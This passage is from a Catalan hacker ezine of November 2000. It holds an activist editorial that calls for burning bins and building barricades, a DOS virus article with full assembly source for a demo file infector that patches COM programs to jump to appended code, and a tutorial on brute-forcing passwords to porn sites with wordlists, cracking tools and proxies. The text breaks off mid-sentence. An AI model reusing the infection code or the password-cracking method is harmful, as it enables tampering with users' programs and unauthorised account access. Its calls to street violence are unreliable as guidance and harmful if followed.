.============================================================================.
|                                                                            |
|              .--- ----.  .  .   . ----.  .--- ,   ,     .----              |
|             |     .--.| -|- |___| .--.| |     |__/      |____              |
|             |     |   |  |  |   | |   | |     |  \      |    |             |
|              `--- `---'  `- `   ' `---'  `--- '   '     `----'             |
|                                                                            |
:============================================================================:
|                                |                                           |
|URL: www.sindominio.net/cathack | No ens fem responsables dels danys que es |
|                                | puguin causar en la posada en practica de |
|MAIL: poptph@hotmail.com        | la informacio continguda en aquesta ezine |
|                                |                                           |
`----------------------------------------------------------------------------'
Novembre del 2000
                              -La revista que llegeix l'Aznar a la intimitat.
.----------------------------------------------------------------------------.
| membres:  .----------------------------------------------------------------|
|----------'                                                                 |
|   PGB       < PGB@cataloniamail.com >   BaRner        < barner@iname.com > |
|   QUiCKSHOT   < quick69@nettaxi.com >   Pop.tPH     < poptph@hotmail.com > |
|   LopeHack  <lopelat@thepentagon.com>   Brainstorm <brainstorm@redestb.es> |
|   KL4RK         < kl4rk@nettaxi.com >   Kuduk        < kuduk@lettera.net > |
|   Acastan     < acastan@pie.xtec.es >   Asac-Cat   < txetxe@softhome.net > |
|   Lobo       < pumarovi@bigfoot.com >   KaBron    < kabron@mundomail.net > |
`----------------------------------------------------------------------------'
.----------------------------------------------------------------------------.
| index                                                                      |
|--------.                                   autor         tema         id   |
|         `------------------------------------------------------------------|
|                                                                            |
|  1. Editorial                              cathack*      opinió       $01$ |
|  2. Teoria d'infecció de fitxers COM       Pop.tPH       virii        $02$ |
|  3. XXX Cracking                           }||||{        hack         $03$ |
|  4. Bugs & Exploits                        cathack*      hack         $04$ |
|  5. Com fer un generador de codis (KeyGen) QUiCKSHOT     crack        $05$ |
|  6. popASM 5                               Pop.tPH       programació  $06$ |
|  7. Humor xD                               cathack*      humor        $07$ |
|  8. Links                                  cathack*      h/p/c/v      $08$ |
|  9. Introducció als DoS (2a part)          PGB           hack         $09$ |
|  A. Història d'una cloïssa d'arrels        Pop.tPH       hack         $0A$ |
|  B. Firewall per Linux (IP-CHAIN)          KL4RK         seguretat    $0B$ |
|  C. Ports                                  BaRner        hack         $0C$ |
|  D. Linux Assembly                         Pop.tPH       programació  $0D$ |
|  E. Cau CSD                                LopeHack      MD CSD*      $0E$ |
|  F. Descrambling CATV                      Brainstorm    MD CATV*     $0F$ |
| 10. Fitxers adjunts                        cathack*      h/p/c/v      $10$ |
| 11. Noticies                               BaRner        opinió       $11$ |
| 12. Acomiadament                           cathack*      opinió       $12$ |
|                                                                            |
`============================================================================'
 * cathack * simbolitza tot el grup.
 * MD CSD * Manualidades Disney amb el Canal Satelite Digital.


                                                 Kick enter to crash Keyboard.

                                                        -Linux Asm Example. xD

[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[
]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]
[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[
]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]

$01$

---[ Editorial ]---

                             TOTS SOM FALKO LÜDKER!

Doncs si, ja estem aqui de nou, en una nova edicio de la nostra ezine, esperem
que  us  agradi  i  que us  aprofiti :P  - Poc a poc anem millorant i fent-nos 
coneixer,  i per  tant el  coneixement augmenta.  Bé el fet  és que encara ens
queda  molt  de  camí  per  poder arribar a nivells  d'altres ezines, per aixo
us repetim un cop  mes que aquesta  revista es un espai de lliure expressio on
tot el que ens envieu  sera editat (sempre i quant encaixi amb els temes hpcv,
antifeixisme, drogues,  moviments  socials,  critiques,  opinions,  projectes,
concerts,  etc.   Si   voleu   enviar-nos  algo  feu-lo  a: poptph@hotmail.com

Primer de  tot voldriem aclarar  un tema,  sobre la revista #5,  es veu que el
[hansi], se  li va  acodir copiar  un texte  i traduïr -lo d'una altre revista
sense informar-ho, i això ens ha  portat problemes,  i ens ha rebaixat a tots,
aixi  que demanem disculpes  per lo succeït,  esperem que no torni a passar, i
sobretot: Aule, nosaltres no tenim cap culpa del que va passar amb el [hansi],
va ser ell solet que es va buscar la ruina, ara està desaparegut, no contesta,
pero  farem  dues  coses  principalment: treure  l'article  de  la  revista #5
"Ocultacio d'ips" i possar en  el seu lloc una disculpa i fer fora al [hansi].

Per cert, sembla que hi  ha gent que té  problemes per accedir a la nostra url
...segurament pq té ficat un proxy...doncs bé, per accedir-hi heu de ficar, en
el requadre corresponent la url  "http://cathack.itgo.com:80", aixi es marquen
perfectament   el  protocol   i  el   port  i   el  navegador  no  es  confon.

Hem tingut bastantes kdds entre els membres del grup  per decidir el futur del
grup i objectius i tal...bé tenim  bastantes coses clares... pero son sorpresa
:) jeje, ja  us anireu  enterant... aixi  té més  gràcia... una  d'elles és la
creació  del grup  de noticies  cat.news.hack  o algo per l'estil, i que ja us
podeu imaginar de  que anira  el tema.  :) - tindrà  accés tothom a informació
lliure en català...fins hi tot la policia (hauran de fer cursets de català xD)

Per altres bandes tenim preparats temes de hacks de pàgines nazis i racistes..
pero estan en procés  i ja mirarem de proporcionar-vos informació quan tots el
del  grup ho  decidim  (millor  no saltar  l'alarma ;).  Un altre dels temes a
tractar era el format de la ezine, en principi seguirà sent en TXT tot junt en
un  sol fitxer  i potser  haviat  sortirà  una segona  edició  feta  amb HTML.

Com us haureu donat compte si heu visitat la nostra pàgina (http://cathack.itgo
.com) us haureu adonat que ens l'han tancada... raons? cap, però ens l'han tan-
cada, no  sabem si  per raons  polítiques o  que però  ha passat, també ens hem
adonat que  tenim la llista de correu punxada i per tant molts emails es perden
..puta policia  que no  sap ni punxar!!..  ens toca  els collons  pq no fem res
dolent...es dolent  aprendre? es perillós compartir coneixements? doncs pel que
es veu per ells si, això és llibertat d'expressió? NO! la pàgina anirà canviant
de lloc,  si voleu  saber la  url podeu  informar-vos  al #cathack i xerrar amb
algú de nosaltres o mirar el topic del canal.

Que per cert, precissament l'irc no seria el primer lloc de llibertat d'expres-
sió, més d'algun cop hem tingut problemes amb fatxes amics dels altres fatxes
(els irCOPS) (que deixen les porres pel modem) que es colen al canal robant el
password cedit per l'ircop i fotent-nos fora del canal, insultant-nos i demés.

LA LLIBERTAT FOT FÀSTIG!! AIXÒ NO ÉS LLIBERTAT!!

Akest es el mail k vam rebre...riem una mica amb les escuses k ens donen:

"""""
   Tu recurso:

        http://cathack.itgo.com:80

   que nos fue enviado el 20-Jun-2000 ha sido rechazado
   por una de los siguientes motivos:

        1. Contenido no clasificable en raravista.com
        2. La URL ya esta presente en la base de datos.

   El equipo de Raravista.com
"""""

jojojo que bó!! inclasificable!!! jajaja ja està present!! uuh que em moro!

No podem passar per alt tots els problemes k estan havent ultimament amb
lo del carburant, les matricules (o xapes), Palestina, les pallisses de la
policia, etc... però el cert es k no es pot fer cap altre cosa q amotinar-se,
tirar-se al carrer i fer-lis veure als "politics" q es veu k no ho fan tant
bé com es pensen.
  LLUITA ANTIESTATAL! No ens callaran mai a tots!

Esperem  que  us agradi aquesta  nova edició de  la ezine...i bé poca cosa més,
l'estiu ha estat bastant aborrit, ja que molts marxaven fora i no podien seguir
aprenent desde casa...i han hagut de passar-se al phreak a londres ;), però per
alguns pocs l'estiu ha sigut un bon moment per aprendre i aixi us ho oferim...
que aprofiti! - mandonguilles i pesols!!!




              "Si els poetes son els legisladors no reconeguts
               del mon, els escriptors de ciencia ficcio son els
               seus bufons de cort. Som pallasos sabis que podem
               saltar, donar volteretes, fer profecies i rascar-
               se en public. Podem jugar amb Grans Idees perque
               els extravagants colors dels nostres origens de
               revista barata ens fan semblar inofensius."
                                               -William Gibson


PD: Per cert: Falko Lüdker és un punk d'alemania k fa poc va ser assassinat
    per nazis. La lluita continua!

PD2: Si us falten alguns fitxers baixeu-vos la ezine en format .zip i allà
    trobareu els fitxers adjunts (.jpg, .c, etc., .txt)

PD3: Els horaris de les xerrades també estàn escrits en fitxers adjunts a la
    ezine

PD4: El 12 d'Oktubre...A LIARLA! NO AL FEIXISME! CREMEM CONTENIDORS! FEM
    BARRICADES!, PERO IMPEDIM QUE ELS FEIXISTES PUGUIN PASSEJAR I PROCLAMAR
    CONSIGNES, NO NOMÉS A LA NOSTRA CIUTAT, NI BARRI, SINO EN CAP LLOC DEL
    MÓN! - MORT AL FEIXISME!!.



                                                             -CatHack#06-


==============================================================================
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
==============================================================================

$02$

   .==========================.
 //                            \\
|| Teoria d'infeccio en DOS     ||
||                              ||
||                per Pop.tPH   ||
 \\                            //
   `=========================='


Introducció:

En aquest article us explicaré unes quantes teories (el codi us el curreu
vosaltres ala!) sobre com els virus de DOS poden infectar fitxers COM
encara que la majoria només utilitzen una tècnica "estandar", també és
possible infectar d'altres formes...de pas us ensenyo dues inventades per
mi :P - Clar que no totes són iguals d'eficients... veiem-ho:


Tipus d'infeccions:

 1) Estandar    ( jmp + hoste + virus )
 2) Apriori     ( virus + hoste )
 3) Intercalat  ( jmp + hoste1 + virus + hoste2 )

 4) PopMètodes
 4.1) IOF - Infect On Finish
 4.2) LFJ - Looking for Jumps


1) Estandar:
        Aquest mètode és el més utilitzat pels virus de DOS, ja que és el
        més eficient, encara que també és el més fàcil de detectar, perquè
        tots els fitxers infectats contenen un E9h al principi (un salt al
        codi del virus), un cop salta al virus, l'executa, restableix la
        capçalera i de nou salta a l'inici del programa.

        Explicació gràfica:
            _______________
       .-- |___Jmp_Virus___| <-.
      |    |               |  _|_________________________________________
      |    |     Hoste     | | Restableix la capçalera (3bytes=jmp+####) |
      |    |_______________| |___________________________________________|
      |    |               |   |
       `-> |     Virus     | --'
           |_______________|

        Aquest mètode és el més ràpid, ja que és el que ha de moure el
        minim de bytes dins del fitxer (3=jmp+####)


2) Apriori:
        Aquest mètode és molt poc utilitzat, ja que pot portar a problemes
        ja que el hoste no calcula el delta offset (la ip d'inici) i per
        tant si ha d'agafar variables no les agafarà bé, pq hauria d'agafar
        de BP+XX i no XX. Encara que també es podria crear un virus que un
        cop executat copies una rutina al final del segment (porai els
        FF00) i copies el codi del programa al offset original (0000h) i
        tornés amb un jump a 0 o un PUSH 0 / RET (que vé a ser el mateix
        pero em feia gracia comentar-ho :P

        Explicació gràfica:

         _____________            ____________                _________
        |             |          |            |              |         |
        |    Virus    |  ___|\   |   Virus    | -.    __|\   |  Hoste  | <-.
        |_____________| |      \ |____________|   |  |     \ |_________|   |
        |             | |___   / |            |   |  |__   /               |
        |    Hoste    |     |/   |   Hoste    |   |     |/                 |
        |_____________|          |____________|   |                        |
                                  ____________    |            ________    |
                                 |            | <-'           |        |   |
                                 | Copy & Run |               |  Run   | --'
                                 |____________|               |________|


3) Intercalat:
        Aquest mètode és molt poc utilitzat, ja que pot portar problemes,
        és molt lent, complicat i només es pot aplicar en fitxer .COM,
        encara que en teoria també seria possible fer-ho sobre .EXEs però
        seria molt més complicat perquè hauria d'estar canviant constantment
        de segment.

        El virus infecta el fitxer seguint aquests pasos:
          __________      ___________
     (1) |          |    | jmp virus | --> Salt al codi de virus.
         |  fitxer  |    |-----------|
         |  victima | -> |  hoste 1  | --> Parteix el codi del fitxer victima
         |__________|    |___________|     en dues parts que reparteix.
                         |           |
                         |   virus   | --> Codi del virus intercalat entre
                         |___________|     els hostes.
                         |           |
                         |  hoste 2  | --> Segona part del codi hoste.
                         |___________|

         Un de les avantatges d'aquest tipus d'infecció és que la seva
         desinfecció és quasi impossible, ja que l'antivirus hauria d'anar
         calculant el codi del virus, o analitzar-lo per poder substituïr la
         part del hoste 2 sobre la del virus i sobreescriure el jmp_virus per
         els autentics 3 bytes. A més, la detecció d'infecció seria més
         complicada perquè l'apuntador al codi del virus pot ser aleatori, i
         per tant impossible (molt dificil, res és impossible :) de detectar.

         Per ara fixemnos en com el virus fa per desinfectar el fitxer i
         retornar el control al hoste original:

         1.- Neteja els 3 primers bytes del fitxer que representen el jmp
             virus, per fer-ho recòrre a una variable de 3 bytes que ha
             de tindre dins del codi del virus, que la graba quan infecta
             un fitxer.

         2.- Copia una rutina al final del codi (per allà els FF00h, per
             aixo ha de mirar que el fitxer no sigui excessivament gran
             (+50.000 bytes)) - La funció d'aquesta rutina és la de moure
             la part de "hoste2" a continuació del "hoste1" i per tant
             substituïnt el codi del virus.

         3.- Al final de l'execució d'aquesta rutina, retorna el control
             al hoste inicial, fent:
                push 0h
                ret
             o de qualsevol altre forma que us inventeu :)
       

4) Jo no em podia acontentar en presentar-vos un article amb els mètodes
   tipics d'infecció de fitxers sino que a sobre m'he currat mètodes nous
   inventats per mi (toma! ;) - Potser no són gaire ràpids, potser no
   sempre funcionen, pero són mètodes i punt, que poden obrir el món del
   virii a noves possibilitats.


4.1) IOF - Infect On Finish
   Més o menys una traducció cutrilla a l'angles trapero que domino :P
   seria "Infecció Al Finalitzar", que què vol dir aixo??? doncs molt fàcil,
   Es tracta d'un virus que no s'executa al principi com els altres que
   hem vist abans (jmp_virus), sino que busca el moment en que el programa
   retorna el control al DOS, per substituïr aquesta ordre per un salt
   al virus que acabara amb el retorn al control al dos.

    M'explico:
      El virus obre el fitxer XXX.COM (el convidat a infectar-se)
       Copia el seu codi a troços d'uns 100h bytes en un buffer dins del
       codi del virus per tal que no sobrepassem el segment -glups-
       i executa una rutina que busca la cadena hexadecimal "B44Ch", que
       equival a: "MOV AH, 4Ch", i això que és?? doncs és la funció de la
       INT 21H que serveix per tancar el programa i retornar el control
       al DOS, pero sempre ho fa aixi, a vegades, tb retornen el control
       amb un ERRORLEVEL = X (quasi sempre) i llavors haurem de buscar
       la cadena hexadecimal "B8..4C" que equival a: "MOV AX, 4C..h", el
       ".." pot ser qualsevol valor i per tant el deixo a l'aire, aquest
       mètode és més lent ja que ha de buscar bytes amb separacions i per
       tant ho fa amb bytes i no amb words com ho podria fer amb AH,4Ch.

       Doncs bé, un cop ha trobat la possició on està la finalització del
       programa sobreescriu en ella aixo: "E9....h" que vol dir: "JMP ...."
       aquest salt el faria al codi del virus


4.2) LFJ - Looking for Jumps / calls
        Tornem a fer una traduccio cutrecilla i arribem a la conclusio que
        aquest metode infecta buscant salts o calls, es facil, s'ha de fer
        el mateix motor d'abans, pero en busca d'E9h (JMP) i canviar el
        salt a la direccio del virus, llavors el virus...MOLT IMPORTANT...
        cal que grabi tots els registres i despres els restableixi i salti
        a la direccio on marcava l'antic salt (o crida (call))- explico
        graficament.

               CODI ORIGINAL       CODI INFECTAT
               -----\/------       -----\/------
               100 jmp 0110        100 jmp 0115
               103 ...             103 ...
               110 mov ah, 4c      110 mov ah, 4c
               114 int 21          114 int 21
                                   116 pusha
                                   117 [virus]
                                   169 popa
                                   160 jmp 0110
|  TAULA HEXADECIMAL:
`----------------------------------.
  FFxx        -   jmp/call [reg]   | poc emprada, pero pot ser util.
  E8xxxx      -   call xxxx        | bastant emprada...pot portar a error*
  9Axxxxyyyy  -   call yyyy:xxxx   | poc utilitzada...segur k dona error
  E9xxxx      -   jmp xxxx         | bastant utilitzada...pot portar a error*
  EAxxxxyyyy  -   jmp yyyy:xxxx    | poc utilitzada...segur k dona error
           .-----------------------'
           |
           | * = Seria curi¢s especificar la cadena a buscar ajudant-la a
           |     buscar salts o crides dins de certs rangs logics dins del
           |     fitxer per modificar-los.

NOTA: Aquestes tecniques no sempre rulen, pq aquestes cadenes, al ser tant poc
precisses poden portar a errors i corrompre els fitxers infectats, per tant,
recomano, nomes utilitzar-los com a metodes experimentals i intentar millorar
la precissio de les ordres, per fer evitar errors d'infeccio.

ECSEMPLE:
---------
1.- IOF demo infector
2.- Hoste

--[1 - IOF-INF.ASM ]---------------\/------------------------------------
; Infect On Finish (IOF) demo.   .------------------------------------------'|
;-------------------------------'                                            |
;                                                         escrit per Pop.tPH |
;----------------------------------------------------------------------------|
; Aquest programa esta  escrit per demostrar un nou metode d'infecci¢ d'EXEs |
; i COMs sense modificar capçaleres,  simplement escribint el codi del virus |
; al  final del  fitxer i substituint  la finalitzacio  del  programa:  B44C |
; (mov ah,4ch)  per un simple  jump al codi  del "virus".-  Aquest "codi del |
; virus" no fa res de dolent, simplement escriu un missatge al finalitzar el |
; programa. Aquest codi es  pot distribu‹r lliurement mentre no es modifiqui |
; el nom del seu autor: Pop.tPH.                                             |
;----------------------------------------------------------------------------|
;-------\/-------------------[ macros ]--------------
write macro string ; escriu frase
        mov ah,9
        lea dx, string
        int 21h
      endm

eof   macro        ; End Of File
        mov ax, 4202h
        xor cx,cx
        xor dx,dx
        int 21h
      endm
;-------/\-------------------[ macros ]--------------

.model small
jumps           ; resolem els salts llargs
.stack          ; li fiquem piles al programa ;)
.code
        push cs
        pop  ds   ; descorrem el DS

        write filein

        lea  bp, file
        call ReadFileName ; demana fitxer
;----------
        write prces0

        mov  ax, 3D02h ; obre el fitxer per r/w
        lea  dx, file
        int  21h
        jc   err0
        xchg ax, bx
;----------
        write prces1
        eof
        cmp  ax, 0ffffh - viral_size ; mirem el tamany
        ja   err1
        mov  word ptr cs:[filesize], ax ; grabem el tamany

        mov  ax, 4200h
        xor  cx,cx
        xor  dx,dx
        int  21h        ; anem al principi del fitxer

        mov  cx, word ptr cs:[filesize]
        mov  ah, 3Fh
        lea  dx, buffer
        int  21h        ; copiem el codi del programa al buffer
;----------
        write prces2

        xor bp, bp      ; busquem on acaba el programa
        mov cx, word ptr cs:[filesize]
   @search:
        cmp word ptr cs:[buffer+bp], 4CB4h ; MOV AH,4Ch
        jz  found
        inc bp
        loop @search
        jmp err2
   found:
        mov ax, word ptr cs:[filesize]
        sub ax, bp                   ; filesize-on_finalitza
        sub ax, 3                    ; tamany del jump
        mov word ptr cs:[jump+1], ax ; calcula el salt

        mov ax, 4200h
        xor cx, cx
        mov dx, bp
        int 21h        ; es situa en el jump

        mov ah, 40h ; escriu al fitxer
        mov cx, 3
        lea dx, jump
        int 21h
;------------
        write prces3
        eof

        mov ah, 40h
        mov cx, VIRAL_SIZE
        lea dx, VIRAL_CODE
        int 21h         ; escriu el codi del virus
;------------

        mov ah,3eh
        int 21h         ; tanca

        jmp  quit

err0:   write error0
        jmp  Quit
err1:   write error1
        jmp  Quit
err2:   write error2

quit:   write finish

        mov  ah, 4Ch
        int  21h

VIRAL_CODE: ;////////////////////////////////////////////////////////////////
  call delta
delta:
  pop bp
  sub bp, 3
   push cs
   pop ds
  mov ah, 9
  lea dx, frase + bp
  sub dx, offset viral_code ; pq el Viral_Code no comen‡a a 0
  int 21h
  mov ah,4ch
  int 21h

frase db 'Aquest fitxer esta infectat amb la tecnica IOF...escrita per Pop.tPH$'
VIRAL_SIZE equ VIRAL_CODE_END - VIRAL_CODE
VIRAL_CODE_END: ;////////////////////////////////////////////////////////////

; VDS - Virtual Data Segment
filein db  10,13,'.--[ Infect On Finish ]---------------------[ Pop.tPH ]---',10,13
       db  '| Infectar fitxer: $'
prces0 db  10,13,'|---------------------------------------------------------',10,13
       db  '| 1) Obrint fitxer... $'
error0 db  10,13,'|--ERROR-- Cannot Open file. $'
prces1 db  ' OK',10,13
       db  '| 2) Checking size & loading data... $'
error1 db  10,13,'|--ERROR-- File Size Error (bigger than 1 segment). $'
prces2 db  ' OK',10,13
       db  '| 3) Searching Finish function... $'
prces3 db  ' OK',10,13
       db  '| 4) Writing viral code... OK$'
error2 db  10,13,'|--ERROR-- Can`t found the finish function. $'
finish db  10,13,'`---------------------------------------------------------$'
file   db  0,0,0,0,0,0,0,0, 0, 0,0,0, 0
filesize dw  0
jump   db  0E9h, 0, 0 ; New jump to Virus

; CALL - Subrutines
ReadFileName: mov cx, 12
              xor si, si
          @a: xor ax, ax
              int 16h
              cmp ah, 1Ch
               jz @end
               cmp al, 8
               jz @backspace
              mov dx, ax
              mov ah,2
              int 21h ; print char
              mov byte ptr cs:[bp + si], dl
              inc si
          loop @a
          jmp @end
          @backspace:
            inc cx
            cmp si,0
            jz @a
            dec si
            write vackspace
            jmp @a
          @end:
            ret
            vackspace db 8,' ',8,'$'
buffer equ $
end

--[1 - IOF-INF.ASM ]---------------/\------------------------------------

--[2 - HOSTE.BAT ]-----------------\/------------------------------------
@echo off
echo .--------------------------------------------------------------.
echo !  Aquest script crea un hoste per defecte al fitxer HOSTE.COM !
echo !  per poder ser infectat per la tècnica IOF.                  !
echo `--------------------------------------------------------------'

echo a            >  hoste.dbg
echo mov ah, 4c   >> hoste.dbg
echo int 21       >> hoste.dbg
echo.             >> hoste.dbg
echo rcx          >> hoste.dbg
echo 4            >> hoste.dbg
echo w            >> hoste.dbg
echo q            >> hoste.dbg

debug hoste.com < hoste.dbg
del hoste.dbg
--[2 - HOSTE.BAT ]-----------------/\------------------------------------


nota final. INFECCIÓ EXE:
-------------------------
 No sé si us haureu adonat, pero la infecció d'EXEs té un inconvenient, o
 més ben dit, requereix més pasos i calculs, ja que el virus ha de llegir
 la capçalera per saber el CS:IP inicial i final, modificar-los i canviar
 de segments i tal, cosa "bastant complicada" si acabem de començar i que
 deixaré per més endavant.



                                                   // EnJoy The JoInt \\
                                                          Pop.tPH



           >>És el teclat en l'actualitat el que l'espasa per l'edat mitjana?


()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()
&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
888888888888888888888888888888888888888888888888888888888888888888888888888888
&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()

$03$

                        **********************
                        **   XXX Cracking   **
                        **    by  }||||{    **
                        **********************

Bé doncs. Aquest és el meu primer article i espero que no sigui l'últim. Em
van demanar que n'escrivís un i ràpidament vaig pensar que per escriure un
article s'ha de saber perfectament de què parles perquè sinó sempre pots
acabar explicant alguna cosa de manera confusa. Així que la decisió fou ben
fàcil. Dins del HCPV, és en el XXX Cracking on millor em desenvolupo i
segurament és un tema que pot interessar.

Índex:

1. Inicis
2. Definició
3. Estris necessaris
4. Amb això n'hi ha prou?
5. Wordlists
6. Construcció de Wordlists
7. Problemes amb les Wordlists
8. Els Accounts
9. Seguretat - Proxies
10. Fakes i Redireccionaments
11. Consideracions finals

****************************************************************************************

1. Inicis

Que com vaig començar en el tema? Molt fàcil, des dels meus inicis a internet
ara farà més de 5 anys, sempre m'havia interessat pel món del hacking i la
seguretat informàtica però mai havia tingut temps de dedicar-hi una estona a
aprendre'n gaire. Ara ja fa temps, després d'uns examens de febrer, vaig
veure que tindria unes setmanetes lliures i vaig dir-me que era la meva.
Vaig començar a buscar i buscar pàgines, i llegir gran part d'elles. Vaig
arribar a la conclusió que tot i que em pensava que tenia temps, no en tenia
suficient més que per aprendre les bases, així que vaig dir-me que amb tot el
que havia llegit, que em dedicaria només a una cosa, la que creia que seria
més fàcil. Així vaig anar a parar a l'XXX Cracking.

2. Definició

Què considero exactament com a XXX Cracking? Donant per suposat que tothom
sap què vull dir amb "XXX", es tracta de dir quina és la diferència entre
l'XXX Cracking i l'XXX Hacking. Perquè hi ha molta gent que m'ha preguntat
si no considerava que era el mateix. Jo personalment no ho considero igual,
tot i que n'hi ha que si. El meu punt de vista és que en el cas dels XXX
Hackers, el que fan és introduir-se al sistema i agafar l'arxiu complet de
logins/passwords (a partir d'ara ho anomenaré l/p per fer-ho més curt) de la
site que sigui. Els XXX Crackers no necessiten tot l'arxiu, només amb trobar
un l/p en tenen prou, de manera que la site no corre perill de ser donada de
baixa per masses pèrdues econòmiques i tampoc es gastaràn més diners en
canviar el sistema de seguretat. Vist així, el cracking és més pragmàtic i el
hacking més utòpic. Això si, sempre posant el qualificatiu de XXX al davant.

3. Estris necessaris

Hi ha diferents programes que es poden usar per intentar acoseguir el l/p
d'una site XXX, n'hi ha de senzills o de més complicats, n'hi ha de bons i de
dolents, n'hi ha que funcionen realment i n'hi ha que no. Començaré per la
opció que vaig començar jo: un programa senzill i petit que encara uso avui
en dia quan em fa mandra usar els programes amb opcions complicades, el
HackerTTP. Aquest programa es pot trobar a una de les webs més visitades en
el món de l'underground: http://www.deny.de . Que voleu saber noms de més
programes per crackejar passwords? Aquí els teniu:

EntryLE
WWWhack
Web Cracker
GoldenEye
AccessDiver

Etc, etc, etc. N'hi ha molts, aquests són els més coneguts i usats. Jo
personalment uso l'AccessDiver3. Té moltes opcions i no és molt difícil
d'usar. Això si, no intenteu usar-ne cap sense abans haver après les bases
de l'XXX Cracking o podeu patir conseqüències indesitjables (més endavant
veureu perquè).

El programa que useu, però, no és suficient. Això es pot entendre explicant
el funcionament d'aquests programes. Qualsevol d'ells no fa altra cosa que
anar provant diferents l/p a una URL protegida per algun sistema que
necessiti verificar que el l/p és el correcte. Així, es dóna moltes vegades
el cas que per més que vagis provant i provant en diferents llocs protegits
per l/p, no puguis crackejar-ho mai, i en canvi trobes algú que amb 20 segons
te n'ha trobat algun. I et preguntes..... Què passa? Quin és el problema?
Només hi ha dues opcions: la Llista de Paraules o la Llista de Paraules (a
partir d'ara l'anomenaré Wordlist per agilitzar el text). Contràriament a la
creença popular, el millor programa del món només serà tant bo com la
Wordlist que es tingui per fer els intents.

Bé doncs, el segon estri necessari és una bona Wordlist. Com s'aconsegueix
això? Cada cracker té la seva pròpia wordlist, i cap d'ells et donarà la seva,
bàsicament perquè li ha costat temps i esforç construir la seva. Les primeres
Wordlists es poden aconseguir a:

Elite Wordlists Library: http://www.sparkleware.com/lists.html
The Wordlist Project: http://wordlists.cjb.net/
Altres: http://www.cyberarmy.com/search/Cracking/Wordlists/

4. Amb això n'hi ha prou?

Es podria pensar que ja està, que és així de senzill fer els cracks d'XXX
sites. Però no. Clar que podries posar-te a usar la wordlist que hagis baixat
amb el programa que tinguis (probablement el HackerTTP o el que sigui), però
bàsicament hi hauria dos problemes. Per una banda, és molt perillós fer-ho
així, ja que quan conectes amb aquests programes directament a la URL
protegida, queda registrada la teva IP i et poden denunciar (Punt 9-Seguretat-
-Proxies). Per l'altra, no tindràs gaire èxit, ja que encara que trobis una
wordlist, probablement no serà gaire bona (per això està penjada en una web,
perquè poca gent la fa servir).

5. Wordlists

Què em fa falta doncs? Fa falta millorar la wordlist. Com ho faig?

Consideracions sobre les Wordlists:

- Agafa la wordlist que tinguis i revisa-la. Borra tots els l/p antics (com
per exemple els que es basin en l'any en què estan: john1999, etc) o els l/p
massa llargs (Recorda que la gent necessita recordar quina l/p ha posat en la
web on s'ha registrat, i que per tant, acostumen a posar l/p curts i fàcils
de recordar.

- L'important no és la llargada de la Wordlist, sinó la seva qualitat (o
  sigui, el número de l/p que aconsegueixen fer diana com a crack d'una site).
  Això sembla simple, però és un tòpic difícil de trencar en el cracking. La
  més gran no és la millor. La situació perfecta seria tenir una wordlist amb
  l/p usats només per "atacar" la site que intentes crackejar; això, però, és
  totalment impossible. Així doncs es necessita una Wordlist compacta que
  contingui el màxim número de l/p exitosos en la gran majoria de les sites
  XXX protegides.

- Hi ha dos tipus de Wordlists, les Simples i les Combo. Les Simples només
 tenen una columna de paraules possibles, i els programes abans esmentats les
 agafen i van provant de la següent manera: l=paraula/passwd=paraula. Les
 Combo, tenen dos columnes de paraules separades per un espai, de manera que
 els programes agafen com a login la paraula de la primera columna i com a
 passwd la de la segona columna. Les meves preferides són les Combo, ja que
 la majoria de la gent no usa com a passwd la mateixa paraula que al login.
 Tot i així no es pot descartar aquesta possibilitat, i fins i tot hi ha
 llocs que només accepten l/p iguals (no és habitual).

- Recorda afegir a les word lists paraules que habitualment la gent usa com a
 l/p (sex, fuck, girl, cunt, etc.. ), "paraules" sense sentit que no tenen
 altra significat que l'ordre del teclat (qwerty, asdf, zxcv, etc..) o el fet
 de tenir lletres repetides (aaaa, bbbb, aabbcc, abc123, etc).

- És bo tenir diferents Wordlists per sites de temes diferents: BigBoobs,
 Amateurs, Sado, Onlygirls, Lesbian, etc. Això es deu a que moltes vegades,
 quan una persona té un account a una site sobre un tema, és perquè
 probablement li agrada el tema en qüestió, i per tant és possible que tingui
 un altre account amb el mateix l/p en una altra site sobre el mateix tema.
 Això només s'aconsegueix quan portes bastants èxits en diferents sites d'un
 tema con concret. Llavors pots agafar tots els l/p i provar de fer una
 llista només amb aquests l/p i provar amb aquesta abans que amb la gran,
 quan hagis de crackejar una site sobre el tema que tinguis una llista
 específica.

- Com que la majoria de XXX sites de tot el món són en anglès, les wordlists
 és millor tenir-les en anglès i amb paraules angleses o noms anglesos. Però
 tampoc s'ha de descartar mai un l/p amb una altra llengua, perquè en aquestes
 sites hi accedeix gent de tot el món. De la mateixa manera, també s'ha de
 tenir en compte que si s'intenta crackejar una XXX site per exemple de
 llengua castellana, les wordlists normals no serviran casi de res, i s'haurà
 de tenir una wordlist especial per aquestes sites en llengua castellana.

6. Construcció de Wordlists

Un cop tinguis una sèrie de wordlists normaletes, ja és hora de crear la teva
 pròpia tenint en compte totes les consideracions d'abans. Probablement
 tindràs poques opcions amb què anar fent intents. Hi ha una bona manera
 d'aconseguir més possibles paraules com a l/p: vas a una XXX site, copies el
